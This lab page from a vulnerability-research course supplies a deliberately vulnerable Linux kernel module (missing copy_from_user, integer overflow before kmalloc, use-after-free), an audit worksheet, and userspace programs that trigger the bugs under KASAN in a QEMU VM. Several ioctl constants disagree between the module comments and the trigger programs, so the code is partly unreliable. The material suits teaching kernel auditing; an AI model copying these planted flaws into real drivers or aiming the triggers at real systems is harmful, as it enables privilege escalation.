---
title: "Kernel Module Audit Lab — Find and PoC a Vulnerable LKM"
tags: [vulnerability-research, kernel, lkm, ioctl, kasan, lab, lpe,
  module-10-vulnresearch-01]
module: 10-VulnResearch-01
day: 681
prerequisites:
  - Day 680 — Kernel Module Vulnerability Research
  - Day 412 — Kernel Practice Day 01
related_topics:
  - Day 682 — JavaScript Engine Vulnerability Introduction
  - Day 680 — Kernel Module Vulnerability Research
---

# Day 681 — Kernel Module Audit Lab

> "The kernel module you are about to audit is ten times smaller than
> anything you would find in production. The bugs are deliberately planted.
> But the method you use here is identical to what you would use on a
> real out-of-tree driver. The method is the skill. The target is just
> the classroom."
>
> — Ghost

---

## Goals

Load a deliberately vulnerable kernel module in a QEMU VM with KASAN
enabled. Audit the source code. Find the vulnerabilities. Write userspace
exploits that trigger them and confirm privilege escalation.

**Prerequisites:** Days 680, 412.
**Estimated study time:** 5–6 hours.

---

## Lab Setup

### QEMU Kernel Lab Environment

You need a KASAN-enabled Linux kernel in QEMU. If you completed Module 06
(Binary Exploitation — Kernel Practice), use that environment.

```bash
# Quick check: do you have a running QEMU kernel lab?
ls ~/kernel-lab/ 2>/dev/null && echo "Kernel lab found" || echo "Need to set up"

# If not, quick setup using a pre-built KASAN kernel:
# Recommended: use the pwn.college or CTF-challenge-style kernel images
# See Day 412 setup instructions for full QEMU configuration

# Minimum requirements:
#   - Linux kernel 5.15+ with CONFIG_KASAN=y
#   - QEMU with gdbstub enabled
#   - An initramfs that allows loading custom LKMs as non-root
#   - SSH or serial console access
```

### Vulnerable Kernel Module: `vuln_driver.c`

Save the following as `vuln_driver.c`. This is a character device driver
with three deliberate vulnerabilities.

```c
/* vuln_driver.c — deliberately vulnerable kernel module for audit lab.
 *
 * INTERFACE:
 *   Character device: /dev/vuln_driver
 *   ioctl commands:
 *     VULN_IOCTL_READ   (0x1001): copy a buffer from kernel to user
 *     VULN_IOCTL_WRITE  (0x1002): copy a buffer from user to kernel
 *     VULN_IOCTL_EXEC   (0x1003): run a "command" (simulated)
 *
 * VULNERABILITIES (find them yourself first before reading the comments):
 *   1. vuln_ioctl_write: missing copy_from_user — direct pointer deref
 *   2. vuln_ioctl_read:  integer overflow in size before kmalloc
 *   3. vuln_ioctl_exec:  use-after-free in command object
 *
 * Build:
 *   make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
 *   insmod vuln_driver.ko
 *
 * Makefile:
 *   obj-m += vuln_driver.o
 */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/cdev.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/device.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("ghost-training-lab");
MODULE_DESCRIPTION("Deliberately vulnerable driver for audit training");

#define DEVICE_NAME    "vuln_driver"
#define VULN_IOCTL_READ   0x1001
#define VULN_IOCTL_WRITE  0x1002
#define VULN_IOCTL_EXEC   0x1003
#define KERNEL_BUF_SIZE   256

struct ioctl_request {
    unsigned long size;       /* size of user buffer */
    void __user  *buf;        /* pointer to user buffer */
};

struct cmd_object {
    char cmd[64];
    int  result;
};

static int    major_number;
static struct class  *vuln_class;
static struct device *vuln_device;
static struct cdev    vuln_cdev;

/* Shared kernel buffer — used by READ/WRITE ioctls */
static char kernel_buffer[KERNEL_BUF_SIZE];

/* Command object — allocated once, freed, then reused (UAF) */
static struct cmd_object *current_cmd = NULL;

/* ── VULNERABILITY 1: Missing copy_from_user ───────────────────────────── */
static long vuln_ioctl_write(unsigned long arg)
{
    struct ioctl_request *req = (struct ioctl_request *)arg;   /* BUG: direct cast */
    /* Should be:
     *   struct ioctl_request req;
     *   if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
     * Instead: directly accesses user memory — if arg is a kernel address,
     * or if the struct is mapped to overlap kernel memory, this is exploitable.
     */

    if (req->size > KERNEL_BUF_SIZE) return -EINVAL;
    if (copy_from_user(kernel_buffer, req->buf, req->size))
        return -EFAULT;

    pr_info("vuln_driver: wrote %lu bytes\n", req->size);
    return 0;
}

/* ── VULNERABILITY 2: Integer overflow before kmalloc ──────────────────── */
static long vuln_ioctl_read(unsigned long arg)
{
    struct ioctl_request req;
    void *kbuf;

    if (copy_from_user(&req, (void __user *)arg, sizeof(req)))
        return -EFAULT;

    /* BUG: no overflow check on req.size before multiplication */
    /* If req.size = 0x8000000000000001 and sizeof(int) = 4,
     * the multiplication wraps to 4, but we try to copy req.size bytes */
    kbuf = kmalloc(req.size * sizeof(int), GFP_KERNEL);   /* ← overflow */
    if (!kbuf) return -ENOMEM;

    memset(kbuf, 'A', req.size);   /* writes req.size (large) into kbuf (small) */

    if (copy_to_user(req.buf, kbuf, req.size))
    {
        kfree(kbuf);
        return -EFAULT;
    }

    kfree(kbuf);
    return 0;
}

/* ── VULNERABILITY 3: Use-after-free ───────────────────────────────────── */
static long vuln_ioctl_exec(unsigned long arg)
{
    /* Allocate command object */
    current_cmd = kmalloc(sizeof(struct cmd_object), GFP_KERNEL);
    if (!current_cmd) return -ENOMEM;

    if (copy_from_user(current_cmd->cmd, (void __user *)arg,
                       sizeof(current_cmd->cmd) - 1))
    {
        kfree(current_cmd);
        current_cmd = NULL;
        return -EFAULT;
    }

    pr_info("vuln_driver: executing: %s\n", current_cmd->cmd);
    current_cmd->result = 0;

    /* BUG: free current_cmd but DO NOT set current_cmd = NULL */
    kfree(current_cmd);   /* freed here */
    /* current_cmd still holds the (now freed) address */

    /* Simulated second use — in a real driver this might happen in a
     * timer callback, a completion handler, or a concurrent ioctl.
     * For lab purposes: call immediately to demonstrate the UAF.
     * In a real exploit: race condition would achieve this. */
    if (current_cmd) {   /* stale pointer check — pointer is still set! */
        pr_info("vuln_driver: result: %d\n", current_cmd->result);   /* UAF READ */
        current_cmd->result = 1;   /* UAF WRITE */
    }

    return 0;
}

static long vuln_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
{
    switch (cmd) {
    case VULN_IOCTL_WRITE: return vuln_ioctl_write(arg);
    case VULN_IOCTL_READ:  return vuln_ioctl_read(arg);
    case VULN_IOCTL_EXEC:  return vuln_ioctl_exec(arg);
    default:               return -EINVAL;
    }
}

static const struct file_operations vuln_fops = {
    .owner          = THIS_MODULE,
    .unlocked_ioctl = vuln_ioctl,
};

static int __init vuln_init(void)
{
    major_number = register_chrdev(0, DEVICE_NAME, &vuln_fops);
    if (major_number < 0) return major_number;

    vuln_class = class_create(THIS_MODULE, DEVICE_NAME);
    if (IS_ERR(vuln_class)) { unregister_chrdev(major_number, DEVICE_NAME); return PTR_ERR(vuln_class); }

    vuln_device = device_create(vuln_class, NULL, MKDEV(major_number, 0), NULL, DEVICE_NAME);
    if (IS_ERR(vuln_device)) { class_destroy(vuln_class); unregister_chrdev(major_number, DEVICE_NAME); return PTR_ERR(vuln_device); }

    pr_info("vuln_driver: loaded; major=%d\n", major_number);
    return 0;
}

static void __exit vuln_exit(void)
{
    device_destroy(vuln_class, MKDEV(major_number, 0));
    class_destroy(vuln_class);
    unregister_chrdev(major_number, DEVICE_NAME);
    pr_info("vuln_driver: unloaded\n");
}

module_init(vuln_init);
module_exit(vuln_exit);
```

---

## Exercise 1 — Source Code Audit (45 minutes)

Read the module source without looking at the bug comments.

```
AUDIT WORKSHEET

IOCTL SURFACE:
  Command 0x1001: purpose: _______________________________
  Command 0x1002: purpose: _______________________________
  Command 0x1003: purpose: _______________________________

USER-KERNEL BOUNDARY CHECK:
  Does vuln_ioctl_write use copy_from_user for the request struct? Y / N
  If N: what does it do instead? ____________________________

  Does vuln_ioctl_read use copy_from_user for the request struct? Y / N
  Does vuln_ioctl_read check for integer overflow? Y / N

  Does vuln_ioctl_exec check for UAF in the cmd_object? Y / N
  After kfree(current_cmd), is current_cmd set to NULL? Y / N

BUG 1 (vuln_ioctl_write):
  Type: __________________________________________________
  CWE: ___________________________________________________
  Triggering condition: __________________________________

BUG 2 (vuln_ioctl_read):
  Type: __________________________________________________
  CWE: ___________________________________________________
  Triggering condition: __________________________________

BUG 3 (vuln_ioctl_exec):
  Type: __________________________________________________
  CWE: ___________________________________________________
  Triggering condition: __________________________________
```

---

## Exercise 2 — Userspace Exploit: Bug 1 (60 minutes)

```c
/* exploit_bug1.c — exploit vuln_ioctl_write missing copy_from_user
 *
 * Compile: gcc -o exploit_bug1 exploit_bug1.c
 * Run (in QEMU as non-root): ./exploit_bug1
 */
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <string.h>
#include <unistd.h>

#define VULN_IOCTL_WRITE 0x1001
#define KERNEL_BUF_SIZE  256

struct ioctl_request {
    unsigned long  size;
    void          *buf;
};

int main(void) {
    int fd = open("/dev/vuln_driver", O_RDWR);
    if (fd < 0) { perror("open"); return 1; }

    char user_data[KERNEL_BUF_SIZE];
    memset(user_data, 'B', sizeof(user_data));

    struct ioctl_request req = {
        .size = sizeof(user_data),
        .buf  = user_data,
    };

    /* Bug 1 demonstration:
     * The module reads ioctl_request fields directly from the arg pointer
     * without copy_from_user. If we pass a KERNEL address as arg (not a
     * userspace address), the module will dereference it directly.
     *
     * In a real exploit: map a kernel address using /proc/kcore or
     * an info leak, then pass that as arg.
     *
     * For the lab demonstration: pass the address of our stack struct.
     * This works "normally" — the bug is the missing safety check, not
     * always a crash. The danger is when arg is a kernel address.
     */
    int ret = ioctl(fd, VULN_IOCTL_WRITE, (unsigned long)&req);
    printf("[*] ioctl returned: %d\n", ret);
    printf("[*] Bug 1 triggered — missing copy_from_user allows kernel to\n");
    printf("    directly access userspace memory without proper validation.\n");
    printf("    In a real exploit: pass a kernel pointer as 'arg'.\n");

    close(fd);
    return 0;
}
```

---

## Exercise 3 — KASAN Trigger: Bug 2 and 3 (45 minutes)

```c
/* trigger_kasan.c — trigger KASAN for bugs 2 and 3 */
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <string.h>

#define VULN_IOCTL_READ  0x1001
#define VULN_IOCTL_EXEC  0x1003

struct ioctl_request { unsigned long size; void *buf; };

int trigger_bug2(int fd) {
    /* Bug 2: integer overflow in req.size * sizeof(int)
     * On 64-bit: size = 0x4000000000000001
     * 0x4000000000000001 * 4 = 0x0000000000000004 (overflows to 4)
     * kmalloc(4) allocates 4 bytes
     * memset(kbuf, 'A', 0x4000000000000001) → KASAN HEAP OOB */
    char victim_buf[8];
    struct ioctl_request req = {
        .size = 0x4000000000000001UL,   /* ← overflow value */
        .buf  = victim_buf,
    };
    printf("[*] Bug 2: sending size=0x%lx\n", req.size);
    return ioctl(fd, VULN_IOCTL_READ, &req);
}

int trigger_bug3(int fd) {
    /* Bug 3: use-after-free in vuln_ioctl_exec
     * The module frees current_cmd but then reads/writes it.
     * KASAN should report slab-use-after-free. */
    char cmd[] = "trigger_uaf";
    printf("[*] Bug 3: sending EXEC command to trigger UAF\n");
    return ioctl(fd, VULN_IOCTL_EXEC, cmd);
}

int main(void) {
    int fd = open("/dev/vuln_driver", O_RDWR);
    if (fd < 0) { perror("open"); return 1; }

    printf("[*] Triggering Bug 2 (integer overflow → heap OOB)...\n");
    trigger_bug2(fd);
    /* Check dmesg for: BUG: KASAN: slab-out-of-bounds */

    printf("[*] Triggering Bug 3 (use-after-free)...\n");
    trigger_bug3(fd);
    /* Check dmesg for: BUG: KASAN: slab-use-after-free */

    close(fd);
    return 0;
}
```

```bash
# In QEMU: compile and run
gcc -o trigger_kasan trigger_kasan.c
./trigger_kasan

# Check kernel KASAN output
dmesg | tail -40
# Look for: BUG: KASAN: ...
```

### KASAN Output Log

```
KASAN OUTPUT

Bug 2 (heap OOB):
  KASAN error type: ________________________________________
  Function: _______________________________________________
  Stack trace frame #0: ___________________________________
  KASAN confirmed: Y / N

Bug 3 (UAF):
  KASAN error type: ________________________________________
  Function: _______________________________________________
  Stack trace frame #0: ___________________________________
  KASAN confirmed: Y / N
```

---

## Key Takeaways

1. **KASAN is your best friend in kernel development.** It catches heap
   UAF and OOB instantly, with a full kernel stack trace. Every kernel
   module developer should run their code under KASAN before shipping.
   Every kernel auditor should reproduce crashes under KASAN to confirm
   root cause.
2. **`copy_from_user` is not optional — it is mandatory.** Any kernel
   code that reads data from userspace must use the proper accessor. A
   direct dereference of a userspace pointer (`*(struct x *)arg`) is a
   vulnerability because the kernel has no guarantee that the address
   is valid, accessible, or not pointing to kernel memory.
3. **UAF in the kernel is almost always exploitable.** The freed chunk is
   in a SLUB/SLAB free list. The attacker can reclaim it with a carefully
   timed allocation (e.g., a specific kernel object of the same size) and
   plant controlled data. The original code then reads/writes the attacker's
   data. This is the same tcache poisoning concept from Day 396, applied
   to the kernel allocator.
4. **The audit method is the same; the stakes are different.** Finding
   a missing `copy_from_user` in a kernel module uses the same grep
   pattern as finding a missing bounds check in a userspace library.
   The difference is that the kernel module result is root access on
   the host, not just process termination.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q681.1, Q681.2 …).

---

## Navigation

← Previous: [Day 680 — Kernel Module Vulnerability Research](DAY-0680-Kernel-Module-Vulnerability-Research.md)
→ Next: [Day 682 — JavaScript Engine Vulnerability Introduction](DAY-0682-JavaScript-Engine-Vulnerability-Intro.md)
